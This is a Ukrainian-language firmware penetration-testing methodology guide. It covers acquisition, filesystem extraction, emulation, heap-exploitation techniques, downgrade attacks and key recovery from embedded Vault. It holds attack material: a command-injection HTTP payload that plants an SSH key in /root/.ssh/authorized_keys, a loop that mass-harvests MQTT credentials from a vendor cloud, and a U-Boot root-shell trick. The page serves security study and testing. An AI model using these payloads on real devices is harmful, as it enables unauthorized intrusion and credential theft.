Firmware — це необхідне програмне забезпечення, яке забезпечує правильну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Воно зберігається в постійній пам’яті, тож пристрій може отримати доступ до важливих інструкцій одразу після ввімкнення, що забезпечує запуск операційної системи. Аналіз і потенційна модифікація firmware є важливим етапом виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий етап для розуміння структури пристрою та використовуваних ним технологій. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну схему та datasheets
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікати
- Архітектурні діаграми та діаграми потоків
- Оцінювання безпеки та виявлені вразливості

Для цього надзвичайно корисні інструменти **розвідки з відкритих джерел (OSINT)**, так само як і аналіз будь-яких доступних компонентів програмного забезпечення з відкритим вихідним кодом за допомогою ручної та автоматизованої перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), надають безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання firmware**

Отримати firmware можна різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** від джерела (розробників, виробників)
- **Зібрати** за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використати запити **Google dork** для пошуку розміщених файлів firmware
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопити **оновлення** за допомогою технік man-in-the-middle
- **Витягнути** з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехопити** запити на оновлення в комунікаціях пристрою
- Виявити й використати **hardcoded update endpoints**
- **Зняти дамп** із bootloader або мережі
- Якщо нічого не допомогло, **витягнути та зчитати** чип пам’яті за допомогою відповідних апаратних інструментів

### Логи лише через UART: примусово запустити root shell через середовище U-Boot у flash

Якщо UART RX ігнорується (доступні лише логи), можна примусово запустити init shell, **відредагувавши blob середовища U-Boot в автономному режимі**:<sup>[[6]](#references)</sup>

1. Зняти дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3,3 В):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але до розділу env можна записувати через зовнішній доступ до flash.

## Аналіз прошивки

Тепер, коли у вас **є прошивка**, потрібно отримати інформацію про неї, щоб знати, як із нею працювати. Ось кілька інструментів, якими можна скористатися:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдасться знайти багато інформації, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька, образ, імовірно, не зашифрований. Якщо висока — його, ймовірно, зашифровано (або якимось чином стиснуто).

Крім того, за допомогою цих інструментів можна видобути **файли, вбудовані у firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або скористайтеся [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), щоб дослідити файл.

### Отримання файлової системи

За допомогою згаданих вище інструментів, наприклад `binwalk -ev <bin>`, ви мали б змогу **видобути файлову систему**.\
Зазвичай Binwalk видобуває її в **папку з назвою типу файлової системи**. Найчастіше це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне видобування файлової системи

Іноді **сигнатури Binwalk не містять магічних байтів файлової системи**. У таких випадках скористайтеся Binwalk, щоб **знайти зсув файлової системи та вирізати стиснуту файлову систему** з бінарного файлу, а потім **видобути** її вручну відповідно до типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Виконайте наведену нижче **команду dd**, щоб витягти файлову систему Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Альтернативно можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз firmware

Після отримання firmware важливо дослідити його структуру та потенційні вразливості. Для цього використовують різні інструменти, щоб аналізувати firmware та витягувати цінні дані з його образу.

### Інструменти для первинного аналізу

Нижче наведено набір команд для первинного дослідження бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати бінарні дані та зрозуміти деталі розділів і файлових систем:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність шифрування, тоді як висока може свідчити про шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему — часто у каталог, названий за її типом (наприклад, squashfs, ubifs). Однак, якщо **binwalk** не розпізнає тип файлової системи через відсутність magic bytes, потрібне ручне вилучення. Для цього за допомогою `binwalk` знаходять зміщення файлової системи, а потім командою `dd` виділяють її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного видобування вмісту використовують різні команди.

### Аналіз файлової системи

Після видобування файлової системи починається пошук вразливостей. Особливу увагу приділяють незахищеним мережевим демонам, жорстко закодованим обліковим даним, кінцевим точкам API, функціям сервера оновлень, нескомпільованому коду, скриптам запуску та скомпільованим бінарним файлам для офлайн-аналізу.

**Ключові розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти, що можуть містити вразливості
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери й бінарні файли IoT-пристроїв

Інструменти, що допомагають виявляти конфіденційну інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) — для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) — для статичного й динамічного аналізу

### Перевірка безпеки скомпільованих бінарних файлів

Уразливості слід шукати як у вихідному коді, так і в скомпільованих бінарних файлах, знайдених у файловій системі. Такі інструменти, як **checksec.sh** для бінарних файлів Unix і **PESecurity** для бінарних файлів Windows, допомагають виявляти незахищені бінарні файли, якими можна скористатися.

## Отримання хмарної конфігурації та облікових даних MQTT за допомогою токенів URL, отриманих із похідних даних

Багато IoT-концентраторів отримують конфігурацію для кожного пристрою з хмарної кінцевої точки такого вигляду:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки може виявитися, що `<token>` локально обчислюється на основі ідентифікатора пристрою та жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і подається у вигляді шістнадцяткового рядка у верхньому регістрі

За такої схеми будь-хто, хто дізнається deviceId і STATIC_KEY, може відтворити URL і отримати хмарну конфігурацію, у якій часто містяться облікові дані MQTT у відкритому тексті та префікси топіків.

Практичний процес:

1) Отримайте deviceId із журналів завантаження UART

- Під’єднайте UART-адаптер на 3,3 В (TX/RX/GND) і збережіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Знайдіть рядки, у яких виводиться шаблон URL хмарної конфігурації та адреса брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм генерації токена з прошивки

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть дайджест у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть облікові дані cloud config і MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; розберіть його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте незашифрованим MQTT і слабкими ACL для topics (якщо є)

- Використовуйте відновлені облікові дані, щоб підписатися на теми обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Перебирайте передбачувані ID пристроїв (у великому масштабі, з дозволу)

- У багатьох екосистемах використовуються байти OUI виробника/продукту/типу, за якими йде послідовний суфікс.
- Можна програмно перебирати можливі ID, отримувати токени й завантажувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Нотатки
- Завжди отримуйте явний дозвіл перед спробами масового переліку.
- За можливості віддавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.

Емуляція firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може ускладнюватися залежністю від обладнання чи архітектури, але перенесення кореневої файлової системи або окремих бінарних файлів на пристрій із відповідними архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може полегшити подальше тестування.

### Емуляція окремих бінарних файлів

Для аналізу окремих програм важливо визначити порядок байтів і архітектуру CPU програми.

#### Приклад з архітектурою MIPS

Щоб емулявати бінарний файл для архітектури MIPS, можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб встановити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовують `qemu-mips`, а для бінарних файлів із little-endian порядком байтів — `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес аналогічний: для емуляції використовують емулятор `qemu-arm`.

### Емуляція всієї системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують емуляцію всієї прошивки, автоматизують цей процес і допомагають у динамічному аналізі.

## Практичний динамічний аналіз

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберегти доступ до оболонки ОС і файлової системи. Емуляція може не повністю відтворювати взаємодію з апаратним забезпеченням, тому іноді її потрібно перезапускати. Під час аналізу слід повторно перевірити файлову систему, дослідити відкриті вебсторінки й мережеві служби, а також пошукати вразливості завантажувача. Перевірки цілісності прошивки мають вирішальне значення для виявлення потенційних вразливостей, пов’язаних із бекдорами.

## Методи аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі. Для встановлення точок зупинки та виявлення вразливостей за допомогою fuzzing та інших методів використовують такі інструменти, як gdb-multiarch, Frida і Ghidra.

Для вбудованих цільових систем без повноцінного відладчика **скопіюйте на пристрій статично скомпонований `gdbserver` і під’єднайтеся до нього віддалено**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / зіставлення повідомлень radio-co-processor

У IoT-хабах RF-стек часто розділений між **radio MCU** та процесом у Linux userland. Корисний робочий процес — зіставити шлях:<sup>[[8]](#references)</sup>

1. **RF frame** у повітрі
2. **парсер на боці контролера** на radio MCU
3. **текстовий або TLV-протокол через serial/UART**, що передається до Linux (наприклад, `/dev/tty*`)
4. **диспетчер застосунку** в основному daemon
5. **обробник / машина станів**, специфічні для протоколу

Така архітектура створює дві цілі для реверсингу замість однієї. Якщо контролер перетворює бінарні радіокадри на текстовий протокол, наприклад `Group,Command,arg1,arg2,...`, з’ясуйте:

- **групи повідомлень** і таблиці диспетчеризації
- які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- точні **поля-дискримінатори виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- які обробники доступні лише під час **commissioning**, виявлення або завантаження firmware/моделі

Для Zigbee перехопіть трафік сполучення та перевірте, чи ціль досі використовує типовий **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку commissioning може розкрити **Network Key**. Install codes у Zigbee 3.0 зменшують цей ризик, тож зазначте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколу виробника та доступність через FSM

Команди Zigbee/ZCL, специфічні для виробника, часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони передають дані до **власного коду розбору** та внутрішніх **FSM**, які пройшли менш ретельне тестування в бойових умовах.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Проведіть реверсинг диспетчера команд, доки не знайдете **обробник лише для виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, що автоматично просуваються далі, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольований атакувальником стан.
- Перевірте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, замість того щоб вважати, що до вразливого обробника завжди можна дістатися.

Для протоколів, чутливих до таймінгів, повторне відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) із використанням стеку виробника, щоб забезпечити потрібні **endpoints**, **attributes** і таймінги commissioning.

### Клас помилок із фрагментованим завантаженням в embedded-daemon

Поширений клас помилок firmware трапляється під час **фрагментованого завантаження blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Для наступних фрагментів перевіряються лише контрольовані атакувальником **поля окремого пакета**, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки, чи не перевищує розмір початково виділеного буфера.

Це дає змогу атакувальнику надіслати:

- Перший коректний фрагмент із **невеликим** оголошеним загальним розміром, щоб спричинити мале виділення в heap.
- Пізніший фрагмент із **очікуваним offset**, але більшим `chunk_len`.
- Підроблений розмір окремого пакета, що проходить нові перевірки, але все одно спричиняє переповнення початково виділеного буфера.

Якщо вразливий шлях захищений логікою commissioning, для експлуатації потрібно достатньо **емуляції пристрою**, щоб перевести ціль у потрібний стан завантаження моделі або blob перед надсиланням некоректних фрагментів.

### Тригери `free()`, керовані протоколом

В embedded-daemon найпростіший спосіб спричинити експлуатацію метаданих heap — часто не «чекати на очищення», а **спровокувати власну обробку помилок протоколом**:<sup>[[8]](#references)</sup>

- Надсилайте некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте цей передбачуваний виклик `free()`, щоб запустити примітиви на боці алокатора до аварійного завершення процесу з інших причин.

Це особливо корисно проти алокаторів **musl/uClibc/dlmalloc-подібного типу** в embedded Linux, де пошкодження метаданих чанків може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле розміру**, щоб спрямувати обхід алокатора до **підроблених чанків, розміщених усередині переповненого буфера**, замість негайного перезапису справжніх вказівників bin і аварійного завершення процесу.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування мовами низького рівня. Захисти бінарного середовища виконання в embedded-системах трапляються рідко, але коли вони є, можуть знадобитися такі методи, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins і злиття:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення може викликати `__malloc_consolidate()`, тому будь-який підроблений чанк має пройти перевірки (коректний розмір, `fd = 0`, а сусідні чанки мають вважатися «зайнятими»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE під ASLR:** якщо ASLR увімкнено, але основний бінарний файл зібрано **без PIE**, адреси `.data/.bss` усередині бінарного файлу залишаються стабільними. Можна націлитися на область, яка вже схожа на коректний заголовок heap-чанка, щоб спрямувати виділення fastbin на **таблицю вказівників на функції**.
- **NUL, що зупиняє парсер:** під час розбору JSON символ `\x00` у payload може зупинити розбір, зберігши кінцеві байти під контролем атакувальника для stack pivot/ROP-ланцюжка.
- **Shellcode через `/proc/self/mem`:** ROP-ланцюжок, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому mapping і передати на нього керування.

## Атаки зі зниженням версії Firmware та небезпечні механізми оновлення

Навіть коли виробник перевіряє криптографічний підпис образів firmware, **захист від повернення до попередньої версії (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим відкритим ключем, але не порівнює *версію* (або монотонний лічильник) образу, який записується, атакувальник може встановити **старішу вразливу firmware з дійсним підписом** і знову зробити доступними виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий робочий процес атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його з супутніх мобільних/десктопних застосунків (наприклад, із `assets/firmware/` в Android APK).
   * Знайдіть його у сторонніх репозиторіях, як-от VirusTotal, Internet Archive, на форумах тощо.
2. **Завантажте або передайте образ на пристрій** через будь-який доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* HTTP(S)-кінцеві точки, які приймають Base64-кодовані blob-файли firmware, декодують їх на сервері та запускають відновлення/оновлення.
3. Після downgrade експлуатуйте вразливість, яку виправили в новішому випуску (наприклад, фільтр command injection, доданий пізніше).
4. За потреби поверніть пристрій до останнього образу або вимкніть оновлення, щоб уникнути виявлення після отримання persistence.

### Приклад: Command Injection після Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (downgraded) прошивці параметр `md5` безпосередньо додається до shell-команди без санітизації, що дає змогу ін’єктувати довільні команди (у цьому випадку — увімкнути доступ до root через SSH-ключ). У пізніших версіях прошивки додали базовий фільтр символів, але відсутність захисту від downgrade зводить нанівець це виправлення.<sup>[[4]](#references)</sup>

### Вилучення прошивки з мобільних застосунків

Багато виробників додають повні образи прошивки до супутніх мобільних застосунків, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в APK/APEX у незашифрованому вигляді за шляхами на кшталт `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу вилучити підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід захисту від відкату лише в оновлювачі в системах зі слотами A/B

Деякі постачальники реалізують **лічильник захисту від відкату**, але лише в логіці *оновлювача* (наприклад, у процедурі UDS через CAN, команді відновлення або OTA-агенті в просторі користувача). Якщо **завантажувач** згодом перевіряє лише підпис/CRC образу й довіряє таблиці розділів або метаданим слотів, захист від відкату все одно можна обійти.<sup>[[7]](#references)</sup>

Типова слабка схема:

- Метадані прошивки містять і дескриптор версії, і **лічильник захисту від відкату** / монотонний лічильник.
- Оновлювач порівнює значення лічильника образу зі значенням у постійному сховищі й відхиляє старіші підписані образи.
- Завантажувач **не** аналізує цей лічильник і перед завантаженням вибраного слота перевіряє лише заголовок, CRC і підпис.
- Активація слота зберігається окремо — у таблиці розділів або лічильнику поколінь для кожного слота — і криптографічно **не прив’язана** до точного хешу перевіреної прошивки.

У системах із двома слотами це створює примітив **«перевірити один образ / завантажити інший»**. Якщо зловмисник може змусити оновлювач позначити слот B як ціль наступного завантаження, використавши актуальний підписаний образ, а потім перезаписати слот B до перезавантаження, завантажувач усе одно може завантажити старішу прошивку, бо довіряє лише вже збереженим метаданим слота.

Поширений сценарій зловживання:

1. Завантажити **актуальну підписану** прошивку в пасивний слот і виконати звичайну процедуру перевірки/перемикання, щоб розмітка позначила цей слот як наступний активний.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії повторно викликати процедуру підготовки/стирання слота.
3. Скористатися застарілим станом завантаження або логікою вибору слота, щоб оновлювач стер **той самий фізичний слот**, який щойно було активовано.
4. Записати в цей слот **старішу, але все ще підписану** прошивку.
5. Пропустити процедуру перевірки, яка застосовує лічильник захисту від відкату, і виконати перезавантаження напряму.
6. Завантажувач вибирає активований слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звернути увагу під час реверс-аналізу реалізацій оновлення A/B:

- Вибір слота на основі **прапорців під час завантаження**, які не оновлюються після успішного перемикання.
- Функція на кшталт `prepare_passive_slot()`, яка стирає слот на основі застарілого стану, а не **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()`, яка лише збільшує **лічильник поколінь** / змінює прапорець активності й не зберігає хеш перевіреного образу.
- Перевірки лічильника захисту від відкату реалізовані в просторі користувача або в коді оновлювача, але **відсутні** в ROM / завантажувачі / етапах secure boot.
- Процедури стирання або відновлення, які залишають слот позначеним як завантажуваний, навіть після видалення та повторного запису його вмісту.

### Контрольний список для оцінювання логіки оновлення

* Чи належно захищений транспорт/автентифікація *кінцевої точки оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник захисту від відкату** перед прошиванням?
* Чи перевіряється образ у межах secure boot chain (наприклад, чи перевіряє ROM-код підписи)?
* Чи застосовує **завантажувач той самий лічильник захисту від відкату**, що й оновлювач, замість перевірки лише підпису/CRC?
* Чи **прив’язані** метадані активації слота до перевіреного хешу/версії прошивки, чи слот можна змінити після активації?
* Після успішного перемикання слота пристрій примусово перезавантажується, чи в тій самій сесії залишаються доступними інші процедури оновлення/стирання?
* Чи виконує код userland додаткові перевірки коректності (наприклад, перевірку дозволеної карти розділів або номера моделі)?
* Чи використовують *часткові* або *резервні* сценарії оновлення ту саму логіку перевірки?

> 💡  Якщо чогось із переліченого бракує, платформа, імовірно, вразлива до атак із відкатом.

## Відновлення ключів розшифрування прошивки зі стану вбудованих KMS/Vault

Якщо образ оновлення містить невеликі метадані у відкритому вигляді разом із великим блоком із високою ентропією, спершу проаналізуйте контейнер, а не беріться за перебір:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зсуви й межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це сіль, а решта байтів — шифротекст.
- Поле Base64, яке після декодування має рівно `256` байтів, — вагома ознака того, що перед вами RSA-2048-шифротекст, який обгортає випадковий пароль/сеансовий ключ прошивки.
- Відокремлені матеріали PGP у тому самому файлі часто забезпечують лише автентичність; не вважайте, що вони відповідають за конфіденційність.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) нічого не дав, дослідіть **робочий шлях розшифрування**, а не лише шукайте приватні ключі:

- Декомпілюйте оновлювач / бінарний файл керування й простежте, хто читає зашифрований блок, який помічник/API його розпаковує та яке логічне ім’я ключа запитується.
- Пошукайте у витягнутій кореневій файловій системі стан KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit-файли й init-скрипти.
- Розглядайте команди `vault operator unseal ...` у відкритому вигляді, ключі відновлення, токени початкового завантаження або локальні скрипти автоматичного розпечатування KMS як еквівалент матеріалу приватного ключа.

Якщо пристрій постачається з оригінальним бінарним файлом Vault і бекендом сховища, відтворити це середовище зазвичай простіше, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

З root-доступом до клонованого KMS:

- Зробіть transit keys експортованими лише в ізольованому клоні: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ розгортання: `vault read transit/export/encryption-key/<name>`
- Спробуйте використати відновлений ключ RSA з точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала розшифровка OAEP за замовчуванням **не** доводять, що ключ неправильний: у багатьох потоках на базі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від виробника (`EVP_BytesToKey`, часто MD5 на застарілих пристроях), перш ніж пробувати розшифрування AES-CBC.

Так проблема «зашифрованої прошивки» перетворюється на ширше завдання: **відновити робочі ключі на пристрої, а потім офлайн відтворити точні параметри розгортання ключа та KDF**.
